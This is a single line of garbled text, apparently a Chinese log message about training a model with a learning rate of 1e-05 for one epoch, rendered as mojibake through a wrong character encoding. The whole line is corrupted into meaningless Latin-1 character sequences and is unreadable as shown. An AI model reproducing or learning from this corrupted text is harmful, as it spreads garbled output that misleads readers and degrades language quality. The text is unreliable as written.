ÕýÔÚÑµÁ·Ä£ÐÍ£¬Ñ§Ï°ÂÊ£º1e-05£¬ÑµÁ·ÖÜÆÚ£º1
